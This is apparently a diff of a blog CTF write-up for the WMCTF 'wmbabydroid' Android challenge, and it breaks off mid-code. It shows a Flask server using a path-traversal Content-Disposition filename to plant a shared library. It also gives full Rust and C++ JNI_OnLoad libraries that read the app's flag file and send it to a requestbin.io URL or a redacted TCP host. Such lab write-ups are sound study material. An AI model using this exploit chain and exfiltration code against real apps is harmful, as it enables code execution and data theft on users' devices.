+<h3 id="drop-the-file-into-the-internal-storage-file-directory"><a class="markdownIt-Anchor" href="#drop-the-file-into-the-internal-storage-file-directory"></a> Drop the file into the internal storage file directory</h3>
+<p>The downloaded file is being saved in the external storage cache directory:</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String destPath = <span class="keyword">new</span> File(MainActivity.<span class="keyword">this</span>.getExternalCacheDir(), fileName).getPath();</span><br></pre></td></tr></table></figure>
 <p>Because of this we need to find a way to move it to the files directory (shared library will be loaded from that dir):</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">File so = <span class="keyword">new</span> File(getFilesDir() + <span class="string">"/lmao.so"</span>);</span><br></pre></td></tr></table></figure>
-<p>Since the server trusts the <strong>download_name</strong> from the header <strong>Content-Disposition</strong> we can use Path Transversal to save the file to the folder we want. </p>
+<p>Since the server trusts the <strong>download_name</strong> from the header <strong>Content-Disposition</strong> we can use Path Transversal to save the file to the folder we want.</p>
 <p>The file is saved in <code>/storage/emulated/0/Android/data/com.wmctf.wmbabydroid/cache</code> and we want to move it to <code>/data/data/com.wmctf.wmbabydroid/files/lmao.so</code>.</p>
-<p>To achieve this we used the following <strong>download_name</strong> -&gt; <strong>../../../../../../../data/data/com.wmctf.wmbabydroid/files/lmao.so</strong>.</p>
+<p>To achieve this we used the following <strong>download_name</strong> -&gt; <strong>…/…/…/…/…/…/…/data/data/com.wmctf.wmbabydroid/files/lmao.so</strong>.</p>
 <p>We used flask to implement the server in the backend:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, send_file, make_response,render_template</span><br><span class="line"><span class="keyword">from</span> flask_cors <span class="keyword">import</span> CORS</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_app</span><span class="params">(test_config=None)</span>:</span></span><br><span class="line">    app = Flask(__name__)</span><br><span class="line">    CORS(app, expose_headers=[<span class="string">"Content-Disposition"</span>])</span><br><span class="line"></span><br><span class="line"><span class="meta">    @app.route('/')</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @app.route('/download')</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">download</span><span class="params">()</span>:</span></span><br><span class="line">        response = make_response(send_file(</span><br><span class="line">            <span class="string">"libcargo.so"</span>,</span><br><span class="line">            as_attachment=<span class="keyword">True</span>,</span><br><span class="line">            download_name=<span class="string">"../../../../../../../data/data/com.wmctf.wmbabydroid/files/lmao.so"</span></span><br><span class="line">        ))</span><br><span class="line">        response.headers[<span class="string">'Content-Disposition'</span>] = <span class="string">'attachment; filename=../../../../../../../data/data/com.wmctf.wmbabydroid/files/lmao.so'</span></span><br><span class="line">        response.headers[<span class="string">'User-Agent'</span>] = <span class="string">'kekw'</span></span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> app</span><br><span class="line"></span><br><span class="line">create_app().run(debug=<span class="keyword">True</span>, port=<span class="number">80</span>, host=<span class="string">'0.0.0.0'</span>)</span><br></pre></td></tr></table></figure>
-<h3 id="Implement-the-shared-library"><a href="#Implement-the-shared-library" class="headerlink" title="Implement the shared library"></a>Implement the shared library</h3><p>We will have the opportunity to run a <strong>malicious library</strong> in the victim’s device so we need to write a code that will <strong>read the flag</strong> from the file system and send the flag to through a <strong>HTTP request</strong> or a socket using <strong>tcp</strong>.</p>
+<h3 id="implement-the-shared-library"><a class="markdownIt-Anchor" href="#implement-the-shared-library"></a> Implement the shared library</h3>
+<p>We will have the opportunity to run a <strong>malicious library</strong> in the victim’s device so we need to write a code that will <strong>read the flag</strong> from the file system and send the flag to through a <strong>HTTP request</strong> or a socket using <strong>tcp</strong>.</p>
 <p>Usually an android application has <strong>native</strong> methods that will be called from the native lib like in this example:</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">native</span> String <span class="title">getSystemTime</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure>
-<p>In this case we don’t have any, but looking at the documentation it seems when <strong>system.load</strong> is executed a function named <strong>JNI_OnLoad</strong> will be executed:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Loads the native library specified by the &lt;code&gt;libname&lt;/code&gt;</span></span><br><span class="line"><span class="comment">     * argument.  The &lt;code&gt;libname&lt;/code&gt; argument must not contain any platform</span></span><br><span class="line"><span class="comment">     * specific prefix, file extension or path. If a native library</span></span><br><span class="line"><span class="comment">     * called &lt;code&gt;libname&lt;/code&gt; is statically linked with the VM, then the</span></span><br><span class="line"><span class="comment">     * JNI_OnLoad_&lt;code&gt;libname&lt;/code&gt; function exported by the library is invoked.</span></span><br><span class="line"><span class="comment">     * See the JNI Specification for more details.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Otherwise, the libname argument is loaded from a system library</span></span><br><span class="line"><span class="comment">     * location and mapped to a native library image in an implementation-</span></span><br><span class="line"><span class="comment">     * dependent manner.</span></span><br><span class="line"><span class="comment">     **/</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">loadLibrary</span><span class="params">(String libname)</span> </span>&#123;</span><br><span class="line">    Runtime.getRuntime().loadLibrary0(VMStack.getCallingClassLoader(), libname);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>The following picture illustrates this well:<br><a data-fancybox="gallery" href="https://i.imgur.com/YJOtQid.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/YJOtQid.png" alt><br></a></p>
+<p>In this case we don’t have any, but looking at the documentation it seems when <strong>system.load</strong> is executed a function named <strong>JNI_OnLoad</strong> will be executed:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Loads the native library specified by the &lt;code&gt;libname&lt;/code&gt;</span></span><br><span class="line"><span class="comment">     * argument.  The &lt;code&gt;libname&lt;/code&gt; argument must not contain any platform</span></span><br><span class="line"><span class="comment">     * specific prefix, file extension or path. If a native library</span></span><br><span class="line"><span class="comment">     * called &lt;code&gt;libname&lt;/code&gt; is statically linked with the VM, then the</span></span><br><span class="line"><span class="comment">     * JNI_OnLoad_&lt;code&gt;libname&lt;/code&gt; function exported by the library is invoked.</span></span><br><span class="line"><span class="comment">     * See the JNI Specification for more details.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Otherwise, the libname argument is loaded from a system library</span></span><br><span class="line"><span class="comment">     * location and mapped to a native library image in an implementation-</span></span><br><span class="line"><span class="comment">     * dependent manner.</span></span><br><span class="line"><span class="comment">     **/</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">loadLibrary</span><span class="params">(String libname)</span> </span>&#123;</span><br><span class="line">    Runtime.getRuntime().loadLibrary0(VMStack.getCallingClassLoader(), libname);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>The following picture illustrates this well:<br>
+<a data-fancybox="gallery" href="https://i.imgur.com/YJOtQid.png" target="_blank" rel="noopener"><br>
+<img src="https://i.imgur.com/YJOtQid.png" alt><br>
+</a></p>
 <p>I’m not an android developer myself but since I’ve reversed a bunch of <strong>malware</strong> in my work using <strong>rust native libraries</strong> I decided to implement one in rust, since I already had some experience doing it and I thought it wouldn’t be a problem doing it here as well.</p>
 <p>Unfortunately this ended up being an <strong>bad idea</strong> since rust libraries are usually <strong>bigger</strong> than the normal ones and this messed up our final payload (size was about <strong>11mb</strong> but it was enough to disturb the poc in the server).</p>
 <p>For the lulz we will share the rust library we implemented:</p>
 <figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::os::raw::&#123;c_char&#125;;</span><br><span class="line"><span class="keyword">use</span> std::ffi::&#123;CString, CStr&#125;;</span><br><span class="line"><span class="keyword">use</span> std::fs;</span><br><span class="line"><span class="keyword">use</span> std::ffi::c_void;</span><br><span class="line"><span class="keyword">use</span> hyper_tls::HttpsConnector;</span><br><span class="line"><span class="keyword">use</span> std::&#123;thread, time&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[macro_use]</span> <span class="keyword">extern</span> <span class="keyword">crate</span> log;</span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">crate</span> android_log;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">async <span class="function"><span class="keyword">fn</span> <span class="title">kekw</span></span>() -&gt;  <span class="built_in">Result</span>&lt;(), <span class="built_in">Box</span>&lt;dyn std::error::Error&gt;&gt;&#123;</span><br><span class="line">    <span class="comment">// Create a new client object</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">true</span> &#123; </span><br><span class="line">        <span class="keyword">let</span> b = std::path::Path::new(<span class="string">"/data/data/com.wmctf.wmbabydroid/files/flag"</span>).exists();</span><br><span class="line">        info!(<span class="string">"Stuck in the loop &#123;&#125;"</span>, b);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> https2 = HttpsConnector::new();</span><br><span class="line">        <span class="keyword">let</span> client2 = hyper::Client::builder()</span><br><span class="line">        .build::&lt;_, hyper::Body&gt;(https2);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Build out our request</span></span><br><span class="line">        <span class="keyword">let</span> req = hyper::Request::builder()</span><br><span class="line">        .method(hyper::Method::POST)</span><br><span class="line">        .uri(<span class="string">"&lt;redacted&gt;"</span>)</span><br><span class="line">        .header(<span class="string">"user-agent"</span>, <span class="string">"WTF"</span>)</span><br><span class="line">        .header(<span class="string">"content-type"</span>, <span class="string">"application/json"</span>)</span><br><span class="line">        .body(hyper::Body::from(<span class="string">"Stuck waiting for flag"</span>))?;</span><br><span class="line">         <span class="keyword">let</span> resp2 = client2.request(req).await?;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Get the response body bytes.</span></span><br><span class="line">        <span class="keyword">let</span> body_bytes2 = hyper::body::to_bytes(resp2.into_body()).await?;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Convert the body bytes to utf-8</span></span><br><span class="line">        <span class="keyword">let</span> body2 = <span class="built_in">String</span>::from_utf8(body_bytes2.to_vec()).unwrap();</span><br><span class="line">        <span class="keyword">if</span> b &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">let</span> ten_millis = time::Duration::from_millis(<span class="number">500</span>);</span><br><span class="line">        <span class="keyword">let</span> now = time::Instant::now();</span><br><span class="line">        thread::sleep(ten_millis);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//let ten_millis = time::Duration::from_millis(2000);</span></span><br><span class="line">    <span class="comment">//let now = time::Instant::now();</span></span><br><span class="line">    <span class="comment">//thread::sleep(ten_millis);</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">let</span> https = HttpsConnector::new();</span><br><span class="line">    <span class="keyword">let</span> client = hyper::Client::builder()</span><br><span class="line">    .build::&lt;_, hyper::Body&gt;(https);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//let client = hyper::Client::new();</span></span><br><span class="line">    <span class="keyword">let</span> contents = fs::read_to_string(<span class="string">"/data/data/com.wmctf.wmbabydroid/files/flag"</span>)</span><br><span class="line">        .expect(<span class="string">"Should have been able to read the file"</span>);</span><br><span class="line">    info!(<span class="string">"this is a debug &#123;&#125;"</span>, contents);</span><br><span class="line">    <span class="comment">// Build out our request</span></span><br><span class="line">    <span class="keyword">let</span> req = hyper::Request::builder()</span><br><span class="line">        .method(hyper::Method::POST)</span><br><span class="line">        .uri(<span class="string">"https://requestbin.io/wn9ivmwn"</span>)</span><br><span class="line">        .header(<span class="string">"user-agent"</span>, <span class="string">"WTF"</span>)</span><br><span class="line">        .header(<span class="string">"content-type"</span>, <span class="string">"application/json"</span>)</span><br><span class="line">        .body(hyper::Body::from(contents))?;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Pass our request builder object to our client.</span></span><br><span class="line">    <span class="keyword">let</span> resp = client.request(req).await?;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get the response body bytes.</span></span><br><span class="line">    <span class="keyword">let</span> body_bytes = hyper::body::to_bytes(resp.into_body()).await?;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Convert the body bytes to utf-8</span></span><br><span class="line">    <span class="keyword">let</span> body = <span class="built_in">String</span>::from_utf8(body_bytes.to_vec()).unwrap();</span><br><span class="line">    info!(<span class="string">"this is a debug &#123;&#125;"</span>, body);</span><br><span class="line">    <span class="comment">//println!("&#123;&#125;", body);</span></span><br><span class="line">    <span class="literal">Ok</span>(())</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/// Expose the JNI interface for android below</span></span><br><span class="line"><span class="meta">#[cfg(target_os=<span class="meta-string">"android"</span>)]</span></span><br><span class="line"><span class="meta">#[allow(non_snake_case)]</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">mod</span> android &#123;</span><br><span class="line">    <span class="keyword">extern</span> <span class="keyword">crate</span> jni;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">use</span> super::*;</span><br><span class="line">    <span class="keyword">use</span> self::jni::JNIEnv;</span><br><span class="line">    <span class="keyword">use</span> self::jni::JavaVM;</span><br><span class="line">    <span class="keyword">use</span> self::jni::objects::&#123;JClass, JString&#125;;</span><br><span class="line">    <span class="keyword">use</span> self::jni::sys::&#123;jstring&#125;;</span><br><span class="line">    <span class="keyword">use</span> self::jni::sys::JNI_VERSION_1_6;</span><br><span class="line">    <span class="keyword">use</span> self::jni::sys::&#123;jint, jshort&#125;;  </span><br><span class="line"></span><br><span class="line">    <span class="meta">#[no_mangle]</span></span><br><span class="line">    <span class="keyword">pub</span> <span class="keyword">extern</span> <span class="string">"system"</span> <span class="function"><span class="keyword">fn</span> <span class="title">JNI_OnLoad</span></span>(_vm: JavaVM, _reserved: *<span class="keyword">mut</span> c_void) -&gt; jint &#123;</span><br><span class="line">        android_logger::init_once(</span><br><span class="line">            android_logger::Config::<span class="keyword">default</span>().with_min_level(log::Level::Trace),</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> c_str = <span class="keyword">unsafe</span> &#123;  CStr::from_ptr(CString::new(<span class="string">"kekw feast"</span>).unwrap().as_ptr()) &#125;;</span><br><span class="line">        <span class="keyword">let</span> recipient = <span class="keyword">match</span> c_str.to_str() &#123;</span><br><span class="line">            <span class="literal">Err</span>(_) =&gt; <span class="string">"there"</span>,</span><br><span class="line">            <span class="literal">Ok</span>(string) =&gt; string,</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut</span> rt = tokio::runtime::Runtime::new().unwrap();</span><br><span class="line">        <span class="keyword">match</span> rt.block_on(kekw()) &#123;</span><br><span class="line">            <span class="literal">Ok</span>(_) =&gt; info!(<span class="string">"Done"</span>),</span><br><span class="line">            <span class="literal">Err</span>(e) =&gt; error!(<span class="string">"An error ocurred: &#123;&#125;"</span>, e),</span><br><span class="line">        &#125;;</span><br><span class="line">        info!(<span class="string">"kekw"</span>);</span><br><span class="line">        <span class="comment">//CString::new("Hellow ".to_owned() + recipient).unwrap().into_raw();</span></span><br><span class="line">        JNI_VERSION_1_6</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>Rust lib was working locally but not in the challenge server so much later we decided to re-implement using “normal” native libraries (file size was reduced to <strong>800kb</strong>):</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"wmbabydroid.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;android/log.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cassert&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netdb.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netdb.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;thread&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"jni.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">is_file_exist</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *fileName)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">std</span>::<span class="function">ifstream <span class="title">infile</span><span class="params">(fileName)</span></span>;</span><br><span class="line">  <span class="keyword">bool</span> r = infile.good();</span><br><span class="line">  infile.close();</span><br><span class="line">  <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">execute</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">string</span> command)</span></span>&#123;</span><br><span class="line">      <span class="keyword">int</span> sockfd, portno, n;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serv_addr</span>;</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">hostent</span> *<span class="title">server</span>;</span></span><br><span class="line">      <span class="keyword">char</span> buffer[<span class="number">256</span>] = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">      portno = <span class="number">13571</span>;</span><br><span class="line">      sockfd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">      <span class="comment">//if (sockfd &lt; 0)</span></span><br><span class="line">      <span class="comment">//  error("ERROR opening socket");:</span></span><br><span class="line">      server = gethostbyname(<span class="string">"&lt;redacted&gt;"</span>);</span><br><span class="line">      <span class="keyword">if</span> (server == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"ERROR, no such host\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      bzero((<span class="keyword">char</span> *) &amp;serv_addr, <span class="keyword">sizeof</span>(serv_addr));</span><br><span class="line">      serv_addr.sin_family = AF_INET;</span><br><span class="line">      bcopy((<span class="keyword">char</span> *)server-&gt;h_addr,</span><br><span class="line">            (<span class="keyword">char</span> *)&amp;serv_addr.sin_addr.s_addr,</span><br><span class="line">            server-&gt;h_length);</span><br><span class="line">      serv_addr.sin_port = htons(portno);</span><br><span class="line">      <span class="keyword">if</span> (connect(sockfd, (struct sockaddr *) &amp;serv_addr, <span class="keyword">sizeof</span>(serv_addr)) &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"ERROR connecting"</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Please enter the message: "</span>);</span><br><span class="line">      <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_file_exist(<span class="string">"/data/data/com.wmctf.wmbabydroid/files/flag"</span>)) &#123;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        send(sockfd, <span class="string">"File doesn't exist yet\n"</span>, <span class="built_in">strlen</span>(<span class="string">"File doesn't exist yet\n"</span>), <span class="number">0</span>);</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        FILE* fd = fopen(<span class="string">"/data/data/com.wmctf.wmbabydroid/files/flag"</span>, <span class="string">"r"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// loop to extract every characters</span></span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="comment">// reading file</span></span><br><span class="line">            <span class="keyword">char</span> c = fgetc(fd);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// end of file indicator</span></span><br><span class="line">            <span class="keyword">if</span> (feof(fd))</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            buffer[i++] = c;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// closes the file pointed by demo</span></span><br><span class="line">        fclose(fd);</span><br><span class="line"></span><br><span class="line">      n = send(sockfd, buffer, <span class="built_in">strlen</span>(buffer), <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">char</span>* write_error;</span><br><span class="line">      <span class="keyword">if</span>(n &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        write_error = strerror(errno);</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%s"</span>, write_error);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, buffer);</span><br><span class="line">      close(sockfd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function">JNIEXPORT jint <span class="title">JNI_OnLoad</span><span class="params">(JavaVM *vm, <span class="keyword">void</span> *)</span> </span>&#123;</span><br><span class="line">  JNIEnv *env;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (vm-&gt;GetEnv(<span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">void</span> **&gt;(&amp;env), JNI_VERSION_1_6) != JNI_OK) &#123;</span><br><span class="line">    <span class="keyword">return</span> JNI_ERR;</span><br><span class="line">  &#125;</span><br><span class="line">  Task taskPtr;</span><br><span class="line">  <span class="built_in">std</span>::<span class="function">thread <span 